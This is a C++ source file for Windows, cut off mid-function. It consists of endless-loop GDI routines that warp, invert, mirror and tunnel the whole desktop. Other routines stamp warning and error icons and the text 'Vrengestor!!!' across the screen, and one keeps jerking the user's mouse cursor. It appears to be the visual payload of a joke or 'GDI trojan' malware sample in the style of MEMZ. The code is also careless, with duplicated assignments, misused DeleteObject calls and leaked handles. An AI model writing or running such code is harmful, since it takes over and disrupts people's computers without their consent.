#include <Windows.h>

static ULONGLONG r, n;

int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

#include <iostream>

#include <stdlib.h>

//#include "effect.cpp"

#pragma comment (lib, "Winmm.lib")

#include <mmsystem.h>

#include "MMSystem.h"

#include <cmath>

#define _USE_MATH_DEFINES 1

using namespace std;

#define getrandom time(NULL)

#include <time.h>

DWORD WINAPI memz(LPVOID lpvd)
{
	int a, b;
	while (0 == 0)
	{
		a = GetSystemMetrics(0);
		b = GetSystemMetrics(1);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI tunnel(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HWND hwnd = GetDesktopWindow();
	RECT rect;
	while (true)
	{
		GetWindowRect(hwnd, &rect);
		int r = rand() % 2;
		if (r == 0)
		{
			StretchBlt(hdc, 5, 5, rect.right - 10, rect.bottom - 10, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
		}
	}
}

HDC desk;
int sw, sh;
POINT pepe[4];

void GetDesk()
{
	desk = GetDC(0);
	sw = GetSystemMetrics(0);
	sh = GetSystemMetrics(1);
}

DWORD WINAPI MIRROR(LPVOID lpvd)
{
	while (1)
	{
		GetDesk();
		pepe[0].x = sw;
		pepe[0].y = 0;
		pepe[1].x = 0;
		pepe[1].y = 0;
		pepe[2].x = sw;
		pepe[2].y = 0;
		pepe[3].x = 0;
		pepe[3].y = sh;
		PlgBlt(desk, pepe, desk, 0, 0, sw, sh, 0, 0, 0);
		ReleaseDC(0, desk);
		Sleep(500);
	}
}

DWORD WINAPI circles(LPVOID lpvd)
{
	while (true)
	{
		HDC ccc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w;
		int y = rand() % h;
		HRGN rgn = CreateEllipticRgn(x, y, w / 7, w / 7 + y);
		InvertRgn(ccc, rgn);
		ReleaseDC(0, ccc);
		DeleteDC(ccc);
		DeleteObject(rgn);
		Sleep(1000);
	}
}

VOID WINAPI otv()
{
	//while (true)
	//{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	GetWindowRect(GetDesktopWindow(), &wRect);
	HDC dickMen = CreateCompatibleDC(desk);
	HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(dickMen, scr);
	int x2 = rand() & sw;
	wPt[0].x = wRect.left - rand() % sw + sh;
	wPt[0].y = wRect.left - rand() % sw + sh;
	wPt[1].x = wRect.left - rand() % sw + sh;
	wPt[1].y = wRect.left + rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	PlgBlt(dickMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	BitBlt(desk, 0, 0, sw, sh, dickMen, 0, 0, !(rand() % 2) ? (rand() % 2) ? SRCAND : SRCPAINT : !(rand() % 2) ? !(rand() % 2) ? SRCINVERT : SRCPAINT : !(rand() % 2) ? SRCAND : !(rand() % 2) ? SRCERASE : NOTSRCERASE);
	Sleep(1000);
	//}
	/*
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	GetWindowRect(GetDesktopWindow(), &wRect);
	HDC dickMen = CreateCompatibleDC(desk);
	HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(dickMen, scr);
	int x2 = rand() & sw;
	wPt[0].x = wRect.left - rand() % sw + sh;
	wPt[0].y = wRect.left - rand() % sw + sh;
	wPt[1].x = wRect.left - rand() % sw + sh;
	wPt[1].y = wRect.left + rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	PlgBlt(dickMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	BitBlt(desk, 0, 0, sw, sh, dickMen, 0, 0, !(rand() % 2) ? (rand() % 2) ? SRCAND : SRCPAINT : !(rand() % 2) ? !(rand() % 2) ? SRCINVERT : SRCPAINT : !(rand() % 2) ? SRCAND : !(rand() % 2) ? SRCERASE : NOTSRCERASE);
	Sleep(1000);
	*/
}

DWORD WINAPI wow1(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		desk = GetDC(0);
		int x1 = rand() % 310;
		GetWindowRect(GetDesktopWindow(), &wRect);
		HDC deskMen = CreateCompatibleDC(desk);
		HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
		SelectObject(deskMen, scr);
		//int x = rand() % 310;
		wPt[0].x = wRect.left - rand() % 310 + 260;
		wPt[0].y = wRect.top - rand() % 510 + 310;
		wPt[1].x = wRect.right - rand() % 510 + 310;
		wPt[1].y = wRect.top - rand() % 620 + 210;
		wPt[2].x = wRect.left - x1 + rand() % 510 - 310;
		wPt[2].y = wRect.bottom + x1 - rand() % 510 + 310;
		PlgBlt(deskMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		wPt[0].x = wRect.left + rand() % 310 - 260;
		wPt[0].y = wRect.top + rand() % 510 - 310;
		wPt[1].x = wRect.right + rand() % 510 - 310;
		wPt[1].y = wRect.top + rand() % 620 - 210;
		wPt[2].x = wRect.left + x1 - rand() % 510 + 310;
		wPt[2].y = wRect.bottom - x1 + rand() % 510 - 310;
		PlgBlt(deskMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		otv();
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(desk, 0, 0, sw, sh, deskMen, 0, 0, 0x8928E28);
		Sleep(1000);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
		Sleep(1000);
	}
}


DWORD WINAPI wow2(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		desk = GetDC(0);
		//int x1 = rand() % 310;
		GetWindowRect(GetDesktopWindow(), &wRect);
		HDC deskMen = CreateCompatibleDC(desk);
		HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
		SelectObject(deskMen, scr);
		wPt[0].x = wRect.left + 100;
		wPt[0].y = wRect.bottom - 10;
		wPt[1].x = wRect.left + 10;
		wPt[1].y = wRect.bottom + 100;
		wPt[2].x = wRect.left - sw;
		wPt[2].y = wRect.bottom - sh;
		PlgBlt(deskMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.bottom + 10;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.bottom - 10;
		wPt[2].x = wRect.left + 10;
		wPt[2].y = wRect.top + sw;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(desk, 0, 0, sw, sh, deskMen, 0, 0, 0x8928E28);
		StretchBlt(desk, 0, 0, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, rand() % sw, 0 - rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0 - rand() % sw, rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0 - rand() % sw, 0 - rand() % sh, sw, sh, SRCPAINT);
		Sleep(1000);
		if (rand() % 20 == 0) InvalidateRect(0, 0, 0);
		Sleep(1000);
	}
}

DWORD WINAPI effects11(LPVOID lpParam)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);

		for (int i = 0; i < 1900; i++)
		{
			BitBlt(desktop, i, i, i, i, desktop, i, i, NOTSRCCOPY);
		}


		for (int j = 0; j < 1900; j++)
		{
			BitBlt(desktop, j, j, j, j, desktop, 100, 100, NOTSRCCOPY);
		}

		//{

		//}
		//for (int i = 0; i < 1900; i++)
	}
}

DWORD WINAPI helly1(LPVOID lpParam)
{
	HDC DES = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	for (int i = 0;; i++)
	{
		Sleep(1000);
		int(a) = randy() % w;
		int(b) = randy() % h;
		BitBlt(DES, a, b, 200, 200, DES, a + randy() % 21 - 10, b + randy() % 21 - 10, !(randy() & 3) ? 0xEE0086 : 0xCC0020);
		// This is cool effect gdi!!!!!!!!!!!!!!
	}
}

DWORD WINAPI effect(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75)));
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI effect1(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 12, rand() % 12, SRCPAINT);
		Sleep(1000);
	}
}

DWORD WINAPI effect10(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 12, rand() % 12, SRCINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI effect2(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		int r1 = rand() % x;
		int r2 = rand() % y;
		HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hbrush);
		StretchBlt(hdc, 0, 0, x, r2, hdc, r1, r2, 1, 1, PATINVERT);
		Sleep(1000);
	}

}

DWORD WINAPI plg(LPVOID lpvd)
{
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 30;

	while (true)
	{
		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);

		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);

		wPt[0].x = wRect.left + counter;
		wPt[0].y = wRect.top - counter;
		wPt[1].x = wRect.right + counter;
		wPt[1].y = wRect.top + counter;
		wPt[2].x = wRect.left - counter;
		wPt[2].y = wRect.bottom - counter;

		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		//if (counter < 15) counter++;
		//if (counter < 65) counter--;
	}
}

DWORD sines()
{
	HDC desk = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	double angle = 0;
	while (1)
	{
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f)
		{
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			BitBlt(desk, i, 0, 1, sh, desk, i, a, SRCCOPY);
			angle += 40 / 4;
			DeleteObject(&i);
			DeleteObject(&a);
			//Sleep(-1);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk);
		DeleteObject(wnd);
		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&angle);
		//Sleep(-1);
	}
	//Sleep(-1);
}

DWORD WINAPI effect3(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HWND hwnd = GetDesktopWindow();
	RECT rect;
	while (true)
	{
		GetWindowRect(hwnd, &rect);
		int r = rand() % h;
		int r2 = rand() % 2;
		if (r2 == 0)
		{
			//Sleep(500);
			BitBlt(hdc, 1, r, w, 66, hdc, 0, r, SRCCOPY);
		}
		else if (r2 == 1)
		{
			//Sleep(500);
			BitBlt(hdc, 0, r, w, 66, hdc, 1, r, SRCCOPY);
		}
	}
}

DWORD WINAPI MyTextOut(LPVOID lpvd)
{
	HDC hdc;
	POINT cursorPt;
	int sxx = GetCursorPos(&cursorPt);
	int syy = GetCursorPos(&cursorPt);
	LPCWSTR LpText = L"Vrengestor!!! Вренгестор!!!";
	while (1)
	{
		GetCursorPos(&cursorPt);
		hdc = GetWindowDC(GetDesktopWindow());
		sxx = GetSystemMetrics(0);
		syy = GetSystemMetrics(1);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sxx, rand() % syy, LpText, wcslen(LpText));
		Sleep(100);
		TextOutW(hdc, cursorPt.x, cursorPt.y, LpText, wcslen(LpText));
		Sleep(10);
	}
}

DWORD WINAPI glitch(LPVOID lpvd)
{
	int x, y;
	x = GetSystemMetrics(0);
	y = GetSystemMetrics(1);
	while (0 == 0)
	{
		int randy, randx;
		randx = rand() % x;
		randy = rand() % y;
		BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, randx + 200, randy + 200, GetDC(NULL), randx, randy, NOTSRCCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI drawwarning(LPVOID LPSTART)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		Sleep(3000);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
	}

}


DWORD WINAPI drawquestion(LPVOID LPSTART)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		Sleep(2000);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION));
	}

}

DWORD WINAPI drawinfo(LPVOID LPSTART)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		Sleep(1000);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION));
	}

}

DWORD WINAPI error(LPVOID LPSTART)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		Sleep(500);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_HAND));
	}

}

DWORD WINAPI drawerror(LPVOID LPSTART)
{
	HDC hdc = GetDC(0);
	POINT pt;
	while (true)
	{
		GetCursorPos(&pt);
		DrawIcon(hdc, pt.x, pt.y, LoadIcon(0, IDI_HAND));
	}
}

DWORD WINAPI line(LPVOID lpvd)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);


	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{

		/*
		Sleep(1);
		if (rand() % 3 == 2) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}
		else if (rand() % 3 == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}
		*/


		//Beep(rand() % 1560, rand() % 1589);




		if (rand() % 25 == 9)
		{
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);

			Sleep(5000);
		}
		/*
		else if (rand() % 25 == 5)
		{

			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 100, rand() % 5));
			SelectObject(desk, brush);

			//Beep(rand() % 50, rand() % 100);

		}
		*/

		if (rand() % 2 == 1) {





			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(1000);


		}
	}
}

DWORD WINAPI dornizing4(LPVOID lpvd)
{
	while (1)
	{
		HDC desk = GetDC(0);
		int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

		StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
		//StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI dornizing3(LPVOID lpvd)
{
	while (1)
	{
		HDC desk = GetDC(0);
		int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

		//StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
		StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI dornizing2(LPVOID lpvd)
{
	while (1)
	{
		HDC desk = GetDC(0);
		int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

		//StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
		//StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
		StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI dornizing(LPVOID lpvd)
{
	while (1)
	{
		HDC desk = GetDC(0);
		int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

		//StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
		//StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
		StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		//StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI more(LPVOID lpvd)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);


	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{

		RECT rekt;

		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);

		//BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCCOPY);
		//BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCAND);

		Sleep(rand() % 10);

		HDC hDsktp;
		HWND hWnd;
		RECT wRect;
		POINT wPt[3];
		int counter = 10;

		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);

		int x = GetSystemMetrics(SM_CXSCREEN);

		HDC hDc = GetWindowDC(GetDesktopWindow());

		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rect;
		GetWindowRect(hwnd, &rect);
		int w = rect.right - rect.left;

		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);

		int sx = 0, sy = 0;

		HWND desktoq = GetDesktopWindow();

		GetWindowRect(desktoq, &rect);

		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		Sleep(10);
	}
}
/*
DWORD WINAPI more(LPVOID lpvd)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);


	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{
		Sleep(1);

		if (rand() % 7 == 5) {

			HDC desk = GetDC(0);
			int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

			StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
			StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);


		}

		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
		}

		RECT rekt;


		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
			Sleep(100);
		}

		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);

		//PatBlt(hdc, -1, y, sw, h, PATINVERT);
		Sleep(rand() % 10);


		HDC hDsktp;
		HWND hWnd;
		RECT wRect;
		POINT wPt[3];
		int counter = 10;

		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);

		int x = GetSystemMetrics(SM_CXSCREEN);

		//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine, int nCmdShow);
		HDC hDc = GetWindowDC(GetDesktopWindow());

		//Beep(rand() % 1560, rand() % 1589);

		//BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCCOPY);
		//BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCAND);

		//Sleep(100);
		//upWnd = GetForegroundWindow();
		//upHdc = GetDC(upWnd);
		//desktop = GetDC(NULL);
		//BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);

		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rect;
		GetWindowRect(hwnd, &rect);
		int w = rect.right - rect.left;

		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);

		int sx = 0, sy = 0;

		//int xs = GetSystemMetrics(SM_CXSCREEN);
		//int ys = GetSystemMetrics(SM_CYSCREEN);
		//BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, PATINVERT);

		HWND desktoq = GetDesktopWindow();

		GetWindowRect(desktoq, &rect);

		//StretchBlt(desktop, 50, 50, w - 100, h - 100, desktop, 0, 0, w, h, SRCCOPY);
		//Sleep(300);

		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		Sleep(10);

	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(upHdc, CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75)));
		PatBlt(upHdc, rx, ry, rand() % sx + rx, rand() % sy + ry, PATCOPY);
		Sleep(1000);
	}

	}
}
*/
DWORD WINAPI cursor(LPVOID LPSTART)
{
	HDC hdcc = GetDC(0);
	CURSORINFO curinf;
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (1)
	{
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		Sleep(500);
	}
}

DWORD WINAPI MOUSEMOVE(LPVOID lpvd)
{
	while (0 == 0)
	{
		POINT mouse;
		int x;
		int y;
		GetCursorPos(&mouse);
		x = mouse.x;
		y = mouse.y;
		srand(getrandom);
		SetCursorPos(x + rand() % 3 + 1, y + rand() % 3 + 1);
		Sleep(10);
		SetCursorPos(x - rand() % 5 + 1, y - rand() % 5 + 1);
		Sleep(100);
	}
}

DWORD WINAPI sdown(LPVOID pnvd)
{
	HDC screenDC = GetDC(NULL);
	int screenWidth = GetDeviceCaps(screenDC, HORZRES);
	int screenHeight = GetDeviceCaps(screenDC, VERTRES);
	int x;
	while (1)
	{
		x = rand() % screenWidth;
		BitBlt(screenDC, x, 1, 10, screenHeight, screenDC, x, 0, SRCCOPY);
		Sleep(10);
	}
}

DWORD WINAPI PatBlt0(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, rx, ry, rand() % sx + rx, rand() % sy + ry, PATINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI PatBlt110(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, rx, ry, rand() % sx + rx, rand() % sy + ry, PATCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI PatBlt2(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI BadColor(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(upHdc, CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75)));
		PatBlt(upHdc, rx, ry, rand() % sx + rx, rand() % sy + ry, PATINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI plgblt(LPVOID lpvd)
{
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
